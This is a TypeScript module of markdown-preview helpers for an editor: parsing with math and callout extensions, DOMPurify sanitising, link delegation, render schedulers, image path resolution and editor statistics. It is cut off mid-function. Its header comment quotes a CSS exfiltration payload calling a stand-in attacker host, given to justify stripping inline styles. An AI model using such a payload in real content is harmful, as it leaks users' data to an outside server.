/**
 * md-editor — pure helpers for the markdown preview pipeline.
 *
 * Extracted from `index.ts` so they can be tested in isolation under
 * `node:test` (the test file pairs with this one — see md-render.test.ts).
 * Mirrors the split used by text-editor (editor-stats), json-viewer
 * (json-model), html-viewer (html-stats), image-viewer (keymap), and
 * ebook-viewer (plain-text / search-index / annotations-client).
 *
 * The pipeline:
 *   markdown string
 *     → parseMarkdown(content)               (marked)
 *     → sanitizeMarkdownHtml(rawHtml)        (DOMPurify, fixed ALLOWED_ATTR)
 *     → previewPane.innerHTML = clean        (caller, in index.ts)
 *     → previewPane click                    (delegated, via setupLinkDelegation)
 *
 * Three bug fixes landed in this module (see docs/07 §4.1 / docs/09 §18):
 *   - §18.1.2 schedulePreview race → `createPreviewScheduler` with Symbol
 *     token + clearTimeout. Old timers cannot fire against a swapped view.
 *   - §18.4.1 DOMPurify over-permissive `style` attr → dropped from
 *     ALLOWED_ATTR. Inline `style` is no longer allowed; CSS exfiltration
 *     (e.g. `style="background:url(http://attacker/?c=...)"`) is rejected.
 *   - §18.4.2 per-render `addEventListener` on every <a> → replaced by
 *     `setupLinkDelegation` (one-time listener on the pane, walks up via
 *     `closest('a')`). Survives innerHTML replacement and is future-proof
 *     for patch-diff rendering.
 */

import { Marked } from 'marked';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js/lib/common';
import { encodeWhaleFileUrl } from '../../shared/whale-file-url';
import type { Token } from 'marked';

// --- Markdown parsing -----------------------------------------------------

/**
 * Singleton marked instance. Configured once with GFM tables / line breaks
 * disabled (matches the rest of the app's plain-markdown behavior). The
 * lexer+parser split is used so we can compute per-block source line
 * numbers (see `parseMarkdown`).
 */
const md = new Marked();
md.use({ gfm: true, breaks: false });

/**
 * §18.3.3 — math extension. Detects `$...$` (inline) and `$$...$$`
 * (block) and emits placeholder `<span>` / `<div>` elements with
 * `data-katex-source` carrying the raw LaTeX. The KaTeX sandbox
 * (`renderKatex` below) finds these placeholders, dispatches the
 * raw LaTeX through `katex.renderToString`, and replaces the
 * inner HTML with the rendered output.
 *
 * Why a custom marked extension instead of a post-process regex
 * sweep over the rendered HTML: marked's lexer tokenizes the source
 * line-by-line, and a `$` inside a code span (`$code$`) should NOT
 * be treated as math. The inline tokenizer naturally ignores
 * `$` inside code spans (those tokens are emitted by `codespan`
 * first and the inline tokenizer skips over them), so a marked
 * extension is more robust than a regex post-pass.
 *
 * Edge cases handled:
 *   - `$1 + 2 = $3$` — `$3$` matches (non-greedy capture, no `$`
 *     inside). Avoids parsing the first `$1` as start of math.
 *   - `\$literal` — escaped dollar, the start() regex skips positions
 *     preceded by a backslash.
 *   - `$$x$$` inside a paragraph — treated as block (parser handles
 *     block-level first; the line-start rule matches).
 *   - Single `$` at end of line without a closing `$` — NOT matched,
 *     falls back to plain text (no orphan `$`).
 */
md.use({
  extensions: [
    {
      name: 'katexInline',
      level: 'inline',
      // Find the next unescaped `$` to anchor the tokenizer at.
      // `[^$]` ensures we don't start at a `$` inside the math itself.
      start(src: string): number | undefined {
        const m = /(?<!\\)\$[^$]/.exec(src);
        return m?.index;
      },
      tokenizer(src: string) {
        // Inline: `$...$` (no newlines; that's the block form).
        const match = /^\$([^$\n]+?)\$(?!\d)/.exec(src);
        if (!match) return undefined;
        return {
          type: 'katexInline',
          raw: match[0],
          math: match[1],
        };
      },
      // Renderer runs in the main iframe (NOT the sandbox); it
      // emits a placeholder with the raw LaTeX as both visible
      // fallback (`textContent`) and as `data-katex-source` for the
      // sandbox renderer. Sanitized via DOMPurify (the raw LaTeX
      // is user content; `escapeHtml` covers `<`, `>`, `&`, `"`,
      // `'` which are the only chars needed to keep the attribute
      // safe inside HTML).
      renderer(token) {
        const math = (token as unknown as { math: string }).math;
        const safe = math
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
        return (
          `<span class="katex katex-inline" data-katex-source="${safe}">` +
          `<span class="katex-fallback">${safe}</span></span>`
        );
      },
    },
    {
      name: 'katexBlock',
      level: 'block',
      // Only match when `$$` is at the START of a line (block
      // delimiter). Inside a paragraph, this won't trigger because
      // block tokenizers run first and consume leading `$$`.
      start(src: string): number | undefined {
        const m = /^\$\$/m.exec(src);
        return m?.index;
      },
      tokenizer(src: string) {
        // Block: `$$\n...content...\n$$` or `$$...$$` on one line.
        // We accept either form — markdown convention varies.
        const multiline = /^\$\$([\s\S]+?)\$\$(?:\n|$)/.exec(src);
        if (!multiline) return undefined;
        return {
          type: 'katexBlock',
          raw: multiline[0],
          math: multiline[1].trim(),
        };
      },
      renderer(token) {
        const math = (token as unknown as { math: string }).math;
        const safe = math
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
        return (
          `<div class="katex katex-block" data-katex-display="block" ` +
          `data-katex-source="${safe}">` +
          `<div class="katex-fallback">${safe}</div></div>`
        );
      },
    },
  ],
});

/**
 * Compute 1-indexed source line numbers for the top-level block tokens
 * produced by `md.lexer(content)`.
 *
 * Important: marked's lexer emits **inter-block `space` tokens** (with
 * `raw: '\n\n'` for blank-line separators) between block tokens. These
 * are stripped from the renderer's output (they produce no visible HTML)
 * but their newlines still advance the line counter. `raw` on a block
 * token does NOT include the trailing newline (it's consumed into the
 * space token), so a naive `raw.match(/\n/g).length` under-counts and
 * assigns line 1 to every block.
 *
 * The fix: walk every token (including spaces), skip spaces from the
 * output array, but still add their newlines to the running counter so
 * the next block's line is correct. Example: `# Title\n\nbody` produces
 * tokens [heading, space, paragraph] with line numbers [1, -, 3].
 *
 * Used by `parseMarkdown` (to attach `data-source-line` attributes) and
 * `extractToc` (to compute the source line of each heading). The two
 * MUST agree — a TOC entry's `line` is matched against the preview
 * block's `data-source-line` on click, and the entry's `id` is built
 * from the same line number.
 *
 * Exported (not module-private) so `extractToc` and `parseMarkdown` can
 * share the same line-counting implementation. Marked does NOT set
 * `token.line` reliably in v18 — it's `undefined` for top-level
 * blocks in our tests — so the cumulative-raw approach is the only
 * source of truth.
 */
export function computeBlockLineNumbers(tokens: Token[]): number[] {
  const out: number[] = [];
  let cur = 1;
  for (const t of tokens) {
    const raw = (t as { raw?: string }).raw ?? '';
    const type = (t as { type?: string }).type;
    if (type === 'space') {
      // Blank-line separator — not rendered, but advances the line
      // counter so the next block starts on the correct line.
      cur += (raw.match(/\n/g) || []).length;
      continue;
    }
    out.push(cur);
    cur += (raw.match(/\n/g) || []).length;
  }
  return out;
}

/**
 * Render markdown to HTML synchronously, with `data-source-line` attribute
 * attached to every top-level block element (p, h1..6, ul, ol, pre,
 * blockquote, table, hr, dl, div). The attribute enables precise
 * editor→preview scroll sync (see `index.ts syncPreviewScroll`).
 *
 * `marked.parse` is typed as `string | Promise<string>` because the async
 * path returns a promise; with `{ async: false }` (or via the
 * `md.parser(tokens)` call below) it is always a string.
 *
 * Falls back gracefully when no DOMParser is available (e.g., a future
 * test environment without `global-jsdom`) — the line attributes are
 * skipped but the HTML is still valid.
 */
// --- Callout (Obsidian / GitHub Alerts) -----------------------------------

/** Emoji icon per callout type. Unknown types fall back to the note icon. */
const CALLOUT_ICON: Record<string, string> = {
  note: '📝',
  tip: '💡',
  important: '❗',
  warning: '⚠️',
  caution: '🚫',
  info: 'ℹ️',
  success: '✅',
  question: '❓',
  danger: '🔥',
  bug: '🐛',
  example: '📋',
  quote: '💬',
  abstract: '📄',
  failure: '❌',
  todo: '✔️',
};
const DEFAULT_CALLOUT_ICON = '📝';

/**
 * Remove `prefix` from the start of `el`'s leading text node, if that node
 * is a text node beginning with exactly `prefix`. Used to strip the
 * `[!TYPE]` marker line off a callout's first paragraph.
 */
function stripLeadingText(el: Element, prefix: string): void {
  const node = el.firstChild;
  if (!node || node.nodeType !== Node.TEXT_NODE) return;
  const t = node.textContent || '';
  if (!t.startsWith(prefix)) return;
  const rest = t.slice(prefix.length);
  if (rest) node.textContent = rest;
  else node.remove();
}

/**
 * Turn `> [!TYPE]` / `> [!TYPE]: title` / `> [!TYPE]+|-` blockquotes into
 * callout boxes — Obsidian callout syntax (a superset of GitHub Alerts: the
 * parser recognises GitHub's 5 types plus custom titles, folding, and any
 * `[!custom-type]`). Plain blockquotes are left untouched. Runs inside the
 * `parseMarkdown` DOMParser phase so the callout inherits the blockquote's
 * `data-source-line` (TOC / scroll-sync still land correctly).
 *
 * Layout:
 *   - non-fold → `<div class="callout callout-{type}">` with a `.callout-title`
 *     header and `.callout-content` body.
 *   - fold (`-` / `+`) → same shape but `<details>`/`<summary>`, with `open`
 *     set for `+` (expanded) and omitted for `-` (collapsed). Native `<details>`
 *     folding needs no JS.
 */
function transformCallouts(root: Element): void {
  // Static snapshot — we mutate the tree (replaceWith) inside the loop.
  const quotes = Array.from(root.querySelectorAll('blockquote'));
  for (const bq of quotes) {
    const firstP = bq.querySelector('p');
    if (!firstP) continue;
    const text = firstP.textContent || '';
    // `[!TYPE]` then optional fold (+/-) then optional `: title` to end of line.
    const m = /^\[!([\w-]+)\][ \t]*([+-]?)(?::[ \t]*([^\n]*))?(?:\r?\n|$)/.exec(
      text
    );
    if (!m) continue;
    const [, typeRaw, fold, titleRaw] = m;
    const type = typeRaw.toLowerCase();
    const icon = CALLOUT_ICON[type] ?? DEFAULT_CALLOUT_ICON;
    const title = (titleRaw && titleRaw.trim()) || typeRaw.toUpperCase();

    // Strip the `[!TYPE]...` marker line off firstP so it isn't duplicated
    // in the rendered content.
    stripLeadingText(firstP, m[0]);
    if (!firstP.textContent?.trim()) firstP.remove();

    const isFold = fold === '-' || fold === '+';
    const container = document.createElement(isFold ? 'details' : 'div');
    container.className = `callout callout-${type}`;
    if (fold === '+') container.setAttribute('open', '');
    const line = bq.getAttribute('data-source-line');
    if (line) container.setAttribute('data-source-line', line);

    const titleEl = document.createElement(isFold ? 'summary' : 'div');
    titleEl.className = 'callout-title';
    const iconEl = document.createElement('span');
    iconEl.className = 'callout-icon';
    iconEl.textContent = icon;
    titleEl.appendChild(iconEl);
    titleEl.appendChild(document.createTextNode(` ${title}`));
    container.appendChild(titleEl);

    const content = document.createElement('div');
    content.className = 'callout-content';
    while (bq.firstChild) content.appendChild(bq.firstChild);
    container.appendChild(content);

    bq.replaceWith(container);
  }
}

export function parseMarkdown(content: string): string {
  // Protect `> [!TYPE]` from being parsed as a link reference definition.
  // marked consumes `[!info]: title` as a link def (label `!info`, url `title`),
  // stripping the marker before transformCallouts can see it. Escape the
  // leading `[` on blockquote lines that start with `[!` so it survives as a
  // literal `[`; transformCallouts then turns the blockquote into a callout.
  const src = content.replace(/^(\s*>+\s*)\[!/gm, '$1\\[!');
  const tokens = md.lexer(src);
  const html = md.parser(tokens) as string;
  const lineNumbers = computeBlockLineNumbers(tokens);

  if (typeof DOMParser === 'undefined') return html;

  const wrapped = `<div>${html}</div>`;
  const doc = new DOMParser().parseFromString(wrapped, 'text/html');
  const root = doc.body.firstElementChild;
  if (!root) return html;

  // Map top-level tokens 1:1 to top-level DOM children. Markdown block
  // tokens (paragraph / heading / list / etc.) all produce a single
  // top-level element; nested elements (e.g. <p> inside <li>) live
  // inside the corresponding top-level block and are not annotated.
  //
  // §18.3.1 — also stamp each heading with the same `id` slug that
  // `extractToc` produces, so TOC anchor clicks land on the right
  // element. We rebuild the slug locally (cheaper than re-lexing)
  // because we already have the heading text in the DOM.
  const blocks = Array.from(root.children) as HTMLElement[];
  for (let i = 0; i < blocks.length; i++) {
    const line = lineNumbers[i];
    if (line !== undefined) {
      blocks[i].setAttribute('data-source-line', String(line));
    }
    if (blocks[i].tagName.match(/^H[1-6]$/)) {
      const lineForId = line ?? 1;
      const text = (blocks[i].textContent || '').trim();
      blocks[i].setAttribute('id', `md-h-${lineForId}-${text.length}`);
    }
  }
  transformCallouts(root);
  return root.innerHTML;
}

// --- DOMPurify allow-list -------------------------------------------------

/**
 * Read-only allow-list used by `sanitizeMarkdownHtml`. The `ALLOWED_ATTR`
 * entry intentionally **omits** `style` (see §18.4.1) — inline styles are
 * a known CSS-exfiltration vector. Tag-level layout (h1..6 / table / etc.)
 * is governed by `editor.css` selectors, not inline style.
 *
 * Exported as a constant so tests can assert the absence of `style` and
 * any future change has to be a deliberate edit to this file.
 */
export const DOMPURIFY_CONFIG = {
  USE_PROFILES: { html: true },
  ALLOWED_TAGS: [
    'p',
    'br',
    'hr',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'ul',
    'ol',
    'li',
    'strong',
    'b',
    'em',
    'i',
    'u',
    's',
    'span',
    'div',
    'a',
    'img',
    'table',
    'thead',
    'tbody',
    'tr',
    'th',
    'td',
    'blockquote',
    'pre',
    'code',
    'dl',
    'dt',
    'dd',
    // Extra flow / inline tags for rich embedded HTML and callout folding:
    'details',
    'summary',
    'kbd',
    'mark',
    'sub',
    'sup',
    'ins',
    'del',
  ],
  ALLOWED_ATTR: [
    'href',
    'title',
    'alt',
    'src',
    'width',
    'height',
    'class',
  ],
  /**
   * Belt-and-suspenders against `USE_PROFILES: { html: true }`: the HTML
   * profile allows `style` by default, and `ALLOWED_ATTR` is treated as
   * the *intersection* with the profile's allowlist in some DOMPurify
   * versions, so dropping `style` from `ALLOWED_ATTR` is not enough to
   * guarantee it gets stripped. `FORBID_ATTR` is the explicit override.
   * See §18.4.1.
   */
  FORBID_ATTR: ['style'],
} as const;

/**
 * Sanitize raw HTML produced by `marked` against `DOMPURIFY_CONFIG`.
 * Strips `<script>` / event handlers / inline `style` / on* attrs. The
 * caller is responsible for any further `innerHTML` assignment.
 *
 * DOMPurify's default export shape differs between runtimes:
 *   - Browser: `DOMPurify` is the instance, has `.sanitize` directly.
 *   - Node: `DOMPurify` is a factory `DOMPurify(window) → instance`. The
 *     test environment registers `globalThis.window` via `global-jsdom`
 *     AFTER this module is first imported (ES module hoisting), so we
 *     lazily resolve the instance on first call rather than at module
 *     load. Cached after first resolution.
 */
function resolvePurify(): { sanitize(html: string, cfg: typeof DOMPURIFY_CONFIG): string } {
  const dp = DOMPurify as unknown as {
    sanitize?: (html: string, cfg: typeof DOMPURIFY_CONFIG) => string;
  } & ((window: unknown) => { sanitize: (html: string, cfg: typeof DOMPURIFY_CONFIG) => string });
  if (typeof dp.sanitize === 'function') return dp as { sanitize: (html: string, cfg: typeof DOMPURIFY_CONFIG) => string };
  const w = (typeof window !== 'undefined' ? window : (globalThis as unknown as { window?: unknown }).window) as unknown;
  if (!w) {
    throw new Error(
      'md-render: no window available for DOMPurify factory. In Node ' +
        'tests, call globalJsdom() before invoking sanitizeMarkdownHtml().'
    );
  }
  return (dp as unknown as (w: unknown) => { sanitize: (html: string, cfg: typeof DOMPURIFY_CONFIG) => string })(w);
}

let _purify: { sanitize(html: string, cfg: typeof DOMPURIFY_CONFIG): string } | null = null;

export function sanitizeMarkdownHtml(raw: string): string {
  if (!_purify) _purify = resolvePurify();
  return _purify.sanitize(raw, DOMPURIFY_CONFIG);
}

// --- Link click delegation (§18.4.2) --------------------------------------

/**
 * Bind a single click listener on `previewEl` that delegates to the closest
 * `<a>` ancestor. Calls `handler(href)` and `preventDefault()`s the click.
 * Replaces the per-render `previewPane.querySelectorAll('a').forEach(add…)`
 * pattern, which (a) bound one listener per anchor per render — wasteful
 * and (b) silently broke if `innerHTML` was ever replaced with a non-replace
 * strategy (diff patch, virtual scrolling, etc.).
 *
 * Call **once** at startup; the listener survives `innerHTML` replacement.
 * Returns an unbind function for tests / hot reload.
 */
export function setupLinkDelegation(
  previewEl: HTMLElement,
  handler: (href: string) => void
): () => void {
  const onClick = (e: Event) => {
    const target = e.target;
    if (!(target instanceof Node)) return;
    // `closest` is on Element, not generic Node. Narrow via parentElement.
    const start = target instanceof HTMLElement
      ? target
      : target.parentElement;
    if (!start) return;
    const a = start.closest('a');
    if (!a) return;
    const href = a.getAttribute('href');
    if (!href) return;
    e.preventDefault();
    handler(href);
  };
  previewEl.addEventListener('click', onClick);
  return () => previewEl.removeEventListener('click', onClick);
}

// --- Race-free debounce scheduler (§18.1.2) -------------------------------

/**
 * A scheduler for the markdown preview that is safe across view swaps.
 *
 * Two layers of safety:
 *
 *   1. `clearTimeout` on every `schedule()` — rapid keystrokes collapse
 *      into a single fire 300ms after the last call. Standard debounce.
 *
 *   2. `Symbol` token — each `schedule()` mints a fresh token; the timeout
 *      body compares against the latest token before invoking `onRender`.
 *      If the view (or anything else) caused an intervening `schedule()`,
 *      the stale callback is silently dropped. This fixes the bug where
 *      `renderTimeout` survives a file switch and renders against the new
 *      view's document after a `fileContent` message has already done a
 *      synchronous render — wasting work, and occasionally racing with a
 *      half-initialized previewPane.
 *
 * `cancel()` discards the pending timer + invalidates the token. The caller
 * should `cancel()` before swapping the view (`setContent`, `fileContent`).
 *
 * `getDoc` is read at *fire time* under the still-current token, so the
 * caller can pass `() => view.state.doc.toString()` without worrying about
 * the view identity — if the token has been superseded, the result is
 * discarded.
 */
export interface PreviewScheduler {
  schedule(getDoc: () => string, onRender: (doc: string) => void): void;
  cancel(): void;
}

export function createPreviewScheduler(delayMs: number): PreviewScheduler {
  let timer: ReturnType<typeof setTimeout> | null = null;
  let currentToken: symbol | null = null;
  return {
    schedule(getDoc, onRender) {
      const token = Symbol('md-preview');
      currentToken = token;
      if (timer !== null) clearTimeout(timer);
      timer = setTimeout(() => {
        timer = null;
        if (currentToken !== token) return;
        const doc = getDoc();
        currentToken = null;
        onRender(doc);
      }, delayMs);
    },
    cancel() {
      if (timer !== null) {
        clearTimeout(timer);
        timer = null;
      }
      currentToken = null;
    },
  };
}

// --- Code-block syntax highlighting (§18.1.4) ----------------------------

/**
 * Walk the rendered preview and apply syntax highlighting to every
 * `<pre><code>` block. Uses `highlight.js` with the "common" language
 * bundle (35 popular languages — JS/TS/Python/Java/Go/Rust/SQL/Bash/etc.),
 * which is small enough to ship without tree-shaking concerns and covers
 * the vast majority of real-world code blocks in markdown notes.
 *
 * Idempotent: `hljs.highlightElement` detects already-highlighted blocks
 * and skips them, so re-running after another `innerHTML` replace is safe.
 *
 * The caller (index.ts) is responsible for any further DOM mutation; this
 * function is the only place that touches the post-sanitize HTML for
 * highlighting purposes.
 *
 * If no `<pre>` is present (e.g. a pure-prose document), the function is
 * a cheap no-op.
 */
export function highlightCodeBlocks(container: HTMLElement): void {
  // Skip mermaid blocks — hljs has no `mermaid` grammar and would
  // emit a "Could not find the language 'mermaid'" warning for each
  // one. The mermaid pipeline handles them separately (§18.3.3):
  // after this function runs, renderMermaid replaces the original
  // <pre> with a placeholder div, so hljs never even sees them
  // post-render. We still filter the query here to suppress the
  // warnings during the brief window where both code paths see the
  // same DOM.
  const blocks = container.querySelectorAll(
    'pre code:not(.language-mermaid):not(.mermaid)'
  );
  if (blocks.length === 0) return;
  blocks.forEach((el) => {
    hljs.highlightElement(el as HTMLElement);
  });
}

// --- Local image resolution (§18.2.3) -------------------------------------

/**
 * Resolve a `<img src="…">` value against the file's containing directory.
 * Returns the absolute path (or `null` for unresolvable / unsafe inputs).
 *
 * Rules:
 *   - Absolute inputs (Unix `/foo` or Windows `C:\foo` / `C:/foo`) are
 *     returned unchanged after `\` → `/` normalization.
 *   - Anything else (including `..` traversal) is treated as relative
 *     to `currentDir` and concatenated with `/`.
 *   - `null` is returned for `data:`, `blob:`, `http(s):`, and other
 *     scheme-bearing inputs — these are not filesystem paths and the
 *     browser handles them natively. The caller should leave the
 *     `src` attribute as-is for these.
 *
 * `currentDir` is expected to be normalized (no trailing separator) so
 * the resulting path is `currentDir + '/' + rel`.
 */
export function resolveRelativeImagePath(
  currentDir: string | null | undefined,
  rel: string
): string | null {
  if (!rel) return null;
  // Scheme-bearing URLs (http:, https:, data:, blob:, mailto:, etc.)
  // — leave alone, return null to signal "no rewrite needed".
  //
  // Important: a naive `/^[a-z][a-z0-9+.-]*:/i` would also match a
  // Windows drive letter like `C:\abs\img.png` (the `C:` part), and
  // we'd wrongly treat it as a URL scheme. So we use an explicit list
  // of well-known schemes that can appear in markdown image srcs.
  // The list is intentionally narrow — anything not in it is assumed
  // to be a filesystem path (relative or absolute).
  if (
    /^(?:https?|ftp|file|data|blob|mailto|tel|ws|wss|chrome(?:|-extension)|whale-(?:file|extension)):/i.test(
      rel
    )
  ) {
    return null;
  }
  // Absolute path (Unix /, Windows drive letter, or Windows UNC).
  if (rel.startsWith('/') || /^[a-zA-Z]:[\\/]/.test(rel) || rel.startsWith('\\\\')) {
    return rel.replace(/\\/g, '/');
  }
  // Relative — need a base directory to resolve against.
  if (!currentDir) return null;
  // Strip a trailing separator on the base, normalize backslashes to
  // forward slashes (so Windows paths produce a consistent `C:/...`
  // form before joining). Strip leading `./` segments (current-dir
  // reference; semantically a no-op) so the resulting URL is clean.
  // Leave `..` segments in the result — the whale-file:// Range
  // handler resolves them server-side, and stripping here would also
  // require resolving against the host's allowed-roots allowlist,
  // which the extension must not duplicate.
  const base = currentDir.replace(/[\\/]+$/, '').replace(/\\/g, '/');
  const relClean = rel.replace(/^(?:\.\/)+/, '');
  return base + '/' + relClean;
}

/**
 * Walk the rendered preview and rewrite local `<img src="…">` values to
 * `whale-file://<encoded>` URLs so the iframe can stream them through
 * the host's Range handler. Skips:
 *   - data: / blob: / http(s): / mailto: URLs (browsers handle natively)
 *   - any img without a `src` (rare; usually a data-uri background or a
 *     lazy-loading placeholder)
 *   - imgs when `currentDir` is not provided (older hosts; images
 *     stay as relative URLs and 404)
 *
 * Mutates the DOM in place. Idempotent: re-running after another
 * `innerHTML` replace is safe; the freshly-inserted imgs have raw
 * relative `src` from `parseMarkdown`, so this loop just runs again.
 */
export function resolveLocalImages(
  container: HTMLElement,
  currentDir: string | null | undefined
): void {
  if (!currentDir) return;
  const imgs = container.querySelectorAll('img[src]');
  imgs.forEach((el) => {
    const src = el.getAttribute('src');
    if (!src) return;
    const resolved = resolveRelativeImagePath(currentDir, src);
    if (resolved === null) return;
    const url = encodeWhaleFileUrl(resolved);
    if (url) {
      el.setAttribute('src', url);
      // Lazy-load + async decode. The preview re-renders on every edit (full
      // innerHTML swap → brand-new img nodes), so without these the browser
      // requests + decodes every image at once — a storm on the whale-file://
      // Range handler and main-thread decode jank for image-heavy notes.
      el.setAttribute('loading', 'lazy');
      el.setAttribute('decoding', 'async');
    }
  });
}

// --- Status bar (§18.2.2) ------------------------------------------------

import type { EditorState } from '@codemirror/state';

/**
 * Status bar payload derived from a CodeMirror `EditorState`. Pure: no
 * DOM access, no side effects. Index.ts calls this on every
 * `EditorView.updateListener` tick and patches the relevant `<span>`s.
 *
 * Fields:
 *   - `line`     — 1-indexed line number at the cursor's primary anchor
 *   - `col`      — 1-indexed column number on that line
 *   - `length`   — total character count in the document
 *   - `selection`— `to - from` of the primary selection (0 when collapsed)
 *   - `words`    — whitespace-separated token count
 *   - `readingMinutes` — estimate in whole minutes (CJK-aware); 0 for empty
 *
 * For a clean, predictable status bar, `selection` reports the *primary*
 * selection only (CodeMirror supports multi-selection via `ranges`; the
 * status bar shows the first one — matches the convention in text-editor).
 */
export interface StatusInfo {
  line: number;
  col: number;
  length: number;
  selection: number;
  words: number;
  readingMinutes: number;
}

/**
 * Count whitespace-separated tokens. Empty input returns 0 (not 1, as
 * `"".split(/\s+/).filter(Boolean).length` would). For CJK text the
 * splitter sees no whitespace, so consecutive characters count as 1
 * word — close enough for the status-bar "Words" indicator; a more
 * accurate CJK word/character counter is a future §18.3.6 follow-up.
 */
export function countWords(text: string): number {
  if (!text) return 0;
  return text.split(/\s+/).filter(Boolean).length;
}

export function getStatusInfo(state: EditorState): StatusInfo {
  const doc = state.doc;
  const sel = state.selection.main;
  const lineObj = doc.lineAt(sel.from);
  const text = doc.toString();
  return {
    line: lineObj.number,
    col: sel.from - lineObj.from + 1,
    length: doc.length,
    selection: sel.to - sel.from,
    words: countWords(text),
    readingMinutes: estimateReadingMinutes(text),
  };
}

/**
 * Estimate reading time in whole minutes for `text`. Mixed-script
 * docs (English prose with embedded CJK) are handled by counting
 * CJK characters separately and applying a higher CPM (Chinese
 * reading is ~400 characters/minute vs ~200 wpm for English —
 * the latter is the long-cited average for prose).
 *
 * Algorithm:
 *   - `cjk = count of BMP CJK code points (一-鿿, 3400-4DBF, F900-FAFF)`
 *   - `words = countWords(text)` — already counts each CJK run as 1
 *     "word" because the splitter sees no whitespace, so we subtract
 *     `cjk` to get the English-only word count
 *   - minutes = (englishWords / 200) + (cjk / 400), rounded up
 *
 * Pure: no DOM access, no globals. Returns 0 for an empty string.
 * Always returns at least 1 once the doc is non-empty (so the status
 * bar shows "1 min" instead of "0 min" for short notes).
 *
 * Heuristic, not a measured read-time. Real reading speed varies by
 * reader + content; a future §18.3.6 follow-up could allow a
 * user-configurable WPM.
 */
export function estimateReadingMinutes(text: string): number {
  if (!text) return 0;
  const cjkChars = (
    text.match(/[一-鿿㐀-䶿豈-﫿]/g) || []
  ).length;
  const totalWords = countWords(text);
  // Count CJK runs: whitespace-bounded tokens that are pure CJK.
  // We subtract `cjkRuns` (not `cjkChars`) from `totalWords` because
  // `countWords` collapses each CJK run into 1 token — e.g. 200 English
  // words + 400 CJK chars in one run gives `totalWords = 201`,
  // `cjkRuns = 1`, `englishWords = 200`. Subtracting `cjkChars` (400)
  // would over-subtract.
  const cjkRuns = text
    .split(/\s+/)
    .filter((t) => t.length > 0 && /^[一-鿿㐀-䶿豈-﫿]+$/.test(t))
    .length;
  const englishWords = Math.max(0, totalWords - cjkRuns);
  const minutes = englishWords / 200 + cjkChars / 400;
  return Math.max(1, Math.round(minutes));
}

// --- Initial-theme detection (§18.2.5) -----------------------------------

/**
 * Guess the user's preferred color scheme at iframe load. Used as a
 * fallback for the brief window between `DOMContentLoaded` and the
 * host's first `setTheme` message — without it, the user sees a flash
 * of the default (light) theme before the host corrects us.
 *
 * Mirrors `detectInitialTheme()` in pdf-viewer / office-viewer
 * (shared/pdfjs-in-iframe.ts): `window.matchMedia` is preferred; if it
 * throws or returns `no-preference` (some old browsers), we fall back
 * to `'light'`.
 *
 * This is intentionally a pure function that takes no arguments: it
 * reads `window.matchMedia` and returns a string. The caller (index.ts)
 * is responsible for any DOM side effects.
 */
export function detectInitialTheme(): 'light' | 'dark' {
  if (typeof window === 'undefined' || !window.matchMedia) return 'light';
  try {
    return window.matchMedia('(prefers-color-scheme: dark)').matches
      ? 'dark'
      : 'light';
  } catch {
    return 'light';
  }
}

// --- Render dedup + rAF alignment (§18.2.4) ------------------------------

/**
 * Pure predicate: should the caller skip rendering because the
 * preview HTML would be identical to what's already on screen?
 * Compares against the last-rendered source markdown. The content
 * identity check is by string equality — we don't try to compare
 * rendered HTML (the `sanitize` step is the expensive part, so the
 * comparison must happen *before* parseMarkdown + sanitize to win).
 *
 * Returns `true` (skip) when the content is byte-identical to the
 * previous render. Returns `false` (proceed) when:
 *   - no previous render has been recorded
 *   - the content differs in any way (even a single character)
 *
 * Pure: no DOM access, no globals; takes the last + next content
 * strings as arguments. The caller (index.ts) maintains the cache
 * variable in module scope.
 */
export function shouldSkipRender(
  lastContent: string | null,
  nextContent: string
): boolean {
  if (lastContent === null) return false;
  return lastContent === nextContent;
}

/**
 * Create a requestAnimationFrame scheduler for preview render. Each
 * `schedule()` cancels the prior pending rAF (so rapid edits collapse
 * into a single repaint-aligned render) AND guards with a Symbol token
 * (so a stale rAF callback doesn't render against a swapped view).
 *
 * Mirrors the safety pattern of `createPreviewScheduler` (timers) but
 * in the rAF domain. Composes: the outer `createPreviewScheduler`
 * (300ms debounce) fires once after typing stops; the inner rAF
 * scheduler aligns that fire with the next browser repaint, so the
 * `innerHTML = clean` mutation never happens mid-paint.
 */
export interface RafScheduler {
  schedule(fn: () => void): void;
  cancel(): void;
}

export function createRafScheduler(): RafScheduler {
  let handle: number | null = null;
  let currentToken: symbol | null = null;
  return {
    schedule(fn) {
      const token = Symbol('md-render-raf');
      currentToken = token;
      if (handle !== null) cancelAnimationFrame(handle);
      handle = requestAnimationFrame(() => {
        handle = null;
        if (currentToken !== token) return;
        currentToken = null;
        fn();
      });
    },
    cancel() {
      if (handle !== null) {
        cancelAnimationFrame(handle);
        handle = null;
      }
      currentToken = null;
    },
  };
}

// --- Goto Line (§18.2.1) -------------------------------------------------

/**
 * Result of parsing a user-typed Goto Line input. The string comes
 * from `prompt()` (or a custom modal — same shape) and needs to be
 * interpreted as a 1-indexed line number. We accept:
 *   - a positive integer (e.g. `"42"`) → that line number
 *   - a range `"N-M"` → jump to the first line of the range (N)
 *   - whitespace, leading `+`, lowercase / uppercase digits, `0` (treated as line 1)
 *   - anything else → null (caller shows an error / does nothing)
 *
 * Pure function — extracted from `index.ts`'s button handler so it can
 * be unit-tested without bringing up CodeMirror or `window.prompt`.
 *
 * Common in editor UIs (text-editor / VS Code's `Ctrl+G`) — accept
 * both standalone lines and ranges so muscle memory from those tools
 * transfers without retraining.
 */
export interface ParsedLine {
  /** 1-indexed line number, clamped to `[1, maxLines]`. */
  line: number;
  /** The line number the user originally asked for (pre-clamp), for error reporting. */
  requested: number;
}

export function parseLineInput(raw: string, maxLines: number): ParsedLine | null {
  if (maxLines < 1) return null;
  // Strip whitespace + leading `+` (some CLIs use `+42` for "42 lines
  // from current"). Reject empty input.
  const cleaned = raw.trim().replace(/^\+/, '').trim();
  if (!cleaned) return null;
  // Accept the start of an `N-M` range as a convenience.
  const rangeMatch = /^(\d+)\s*-\s*\d+$/.exec(cleaned);
  const numericText = rangeMatch ? rangeMatch[1] : cleaned;
  if (!/^\d+$/.test(numericText)) return null;
  const requested = Number(numericText);
  // Clamp to `[1, maxLines]`. Out-of-range → still clamp (don't return
  // null); the caller can show a "line N out of range, clamped to M"
